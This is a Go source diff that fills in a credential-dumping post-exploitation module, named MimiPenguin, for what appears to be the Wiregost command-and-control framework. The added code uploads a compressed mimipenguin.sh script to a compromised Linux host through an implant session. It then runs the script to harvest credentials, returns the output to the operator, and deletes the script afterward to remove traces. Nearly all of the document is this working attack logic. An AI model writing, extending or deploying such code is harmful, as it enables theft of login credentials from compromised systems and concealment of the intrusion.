@@ -17,8 +17,21 @@
 package MimiPenguin
 
 import (
+	"bytes"
+	"errors"
+	"fmt"
+	"io/ioutil"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"github.com/gogo/protobuf/proto"
+
+	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
+	"github.com/maxlandon/wiregost/server/assets"
 	"github.com/maxlandon/wiregost/server/log"
 	"github.com/maxlandon/wiregost/server/module/templates"
+	"github.com/maxlandon/wiregost/util"
 )
 
 // [ Base Methods ] ------------------------------------------------------------------------//
@@ -38,7 +51,8 @@ func New() *MimiPenguin {
 var modLog = log.ServerLogger("post/linux/x64/bash/credentials/MimiPenguin", "module")
 
 // [ Module Methods ] ------------------------------------------------------------------------//
-func (s *MimiPenguin) Run(command string) (result string, err error) {
+
+func (s *MimiPenguin) Run(requestID int32, command string) (result string, err error) {
 
 	// Check options
 	if ok, err := s.CheckRequiredOptions(); !ok {
@@ -46,10 +60,76 @@ func (s *MimiPenguin) Run(command string) (result string, err error) {
 	}
 
 	// Check session
-	sess, err := s.CheckSession()
+	sess, err := s.GetSession()
 	if sess == nil {
 		return "", err
 	}
 
-	return result, nil
+	// Options
+	src := filepath.Join(assets.GetModulesDir(), strings.Join(s.Path, "/"), "src/mimipenguin.sh")
+	rpath := filepath.Join(s.Options["TempDirectory"].Value, "mimipenguin.sh")
+
+	// Upload MimiPenguin script on target
+	fileBuf, err := ioutil.ReadFile(src)
+	if err != nil {
+		return "", err
+	}
+	uploadGzip := bytes.NewBuffer([]byte{})
+	new(util.Gzip).Encode(uploadGzip, fileBuf)
+
+	data, _ := proto.Marshal(&ghostpb.UploadReq{
+		Encoder: "gzip",
+		Path:    rpath,
+		Data:    uploadGzip.Bytes(),
+	})
+
+	downloading := fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value)
+	s.ModuleEvent(requestID, downloading)
+
+	timeout := time.Second * 30
+	data, err = sess.Request(ghostpb.MsgUploadReq, timeout, data)
+	if err != nil {
+		return "", errors.New(err.Error())
+	} else {
+		s.ModuleEvent(requestID, "Done")
+	}
+
+	// Execute Script
+	running := fmt.Sprintf("Running script ...")
+	s.ModuleEvent(requestID, running)
+	time.Sleep(time.Millisecond * 500)
+
+	data, _ = proto.Marshal(&ghostpb.ExecuteReq{
+		Path:   rpath,
+		Output: true,
+	})
+	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
+	if err != nil {
+		return "", err
+	} else {
+		resp := ghostpb.Execute{}
+		err := proto.Unmarshal(data, &resp)
+		if err != nil {
+			return "", err
+		}
+
+		res := fmt.Sprintf("Results:\n %s", resp.Result)
+		s.ModuleEvent(requestID, res)
+	}
+
+	// Delete script
+	deleting := fmt.Sprintf("Deleting script ...")
+	s.ModuleEvent(requestID, deleting)
+
+	data, _ = proto.Marshal(&ghostpb.RmReq{
+		Path: rpath,
+	})
+	data, err = sess.Request(ghostpb.MsgRmReq, timeout, data)
+	if err != nil {
+		return "", err
+	} else {
+		s.ModuleEvent(requestID, "Done")
+	}
+
+	return "Module executed", nil
 }
